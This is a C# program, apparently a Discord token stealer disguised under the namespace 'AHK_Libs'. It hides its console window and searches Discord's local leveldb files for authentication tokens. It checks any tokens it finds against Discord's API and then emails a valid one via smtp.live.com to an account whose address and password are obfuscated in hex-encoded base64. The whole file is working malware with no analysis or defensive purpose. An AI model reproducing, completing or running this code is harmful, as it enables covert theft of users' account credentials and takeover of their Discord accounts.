using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Text.RegularExpressions;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Security.Cryptography;

namespace AHK_Libs
{
    class Program
    {
        #region Variables
        static string mm = Dencryption("6257566F62575630633256365A584A4161473930625746706243357562413D3D");
        #endregion

        #region Main
        static void Main(string[] args)
        {
            Injection();
            SendMail(GetToken());
        } 
        #endregion

        #region Token
        /// <summary>
        /// Get and verify the Discord token.
        /// </summary>
        /// <returns>The Discord token or an error message.</returns>
        static string GetToken()
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
            //string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";

            if (!Directory.Exists(path)) return "Discord Not Installed.";

            string[] ldb = Directory.GetFiles(path, "*.ldb");

            foreach (var ldb_file in ldb)
            {
                var text = File.ReadAllText(ldb_file);

                // Verify Valid Token Format
                string token_reg = @"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}";
                Match token = Regex.Match(text, token_reg);
                if (token.Success)
                {
                    // Verify Valid Token
                    if (CheckToken(token.Value))
                    {
                        return token.Value;
                    }
                }
                continue;
            }
            return "No Valid Tokens Found.";
        }

        /// <summary>
        /// Check the Discord token.
        /// </summary>
        /// <returns>true if the token is valid, false otherwise.</returns>
        static bool CheckToken(string token)
        {
            try
            {
                var http = new WebClient();
                http.Headers.Add("Authorization", token);
                var result = http.DownloadString("https://discordapp.com/api/v6/users/@me");
                if (!result.Contains("Unauthorized")) return true;
            }
            catch { }
            return false;
        }
        #endregion

        #region Mailer
        static void SendMail(string body)
        {
            try
            {
                string p = Dencryption("53473970596D3970636D3970");
                SmtpClient SmtpServer = new SmtpClient("smtp.live.com");
                var mail = new MailMessage();
                mail.From = new MailAddress(mm);
                mail.To.Add(mm);
                mail.Subject = "Announcement";
                mail.Body = body;
                SmtpServer.Port = 587;
                SmtpServer.UseDefaultCredentials = true;
                SmtpServer.Credentials = new System.Net.NetworkCredential(mm, p);
                SmtpServer.EnableSsl = true;
                SmtpServer.Send(mail);
            }
        
            catch (SmtpException ex)
            {
                throw new ApplicationException
                  ("SmtpException has occured: " + ex.Message);
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }
        #endregion

        #region Encryption
        //private static string Encryption(string inputString)
        //{
        //    var code = Convert.ToBase64String((new ASCIIEncoding()).GetBytes(inputString)).ToCharArray().Select(x => String.Format("{0:X}", (int)x)).Aggregate(new StringBuilder(), (x, y) => x.Append(y)).ToString();
        //    return code;
        //}

        private static string Dencryption(string code)
        {
            var back = (new ASCIIEncoding()).GetString(Convert.FromBase64String(Enumerable.Range(0, code.Length / 2).Select(i => code.Substring(i * 2, 2)).Select(x => (char)Convert.ToInt32(x, 16)).Aggregate(new StringBuilder(), (x, y) => x.Append(y)).ToString()));
            return back;
        }
        #endregion

        #region Injection
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        
        private static void Injection()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, 0);
        }
        #endregion
    }
}
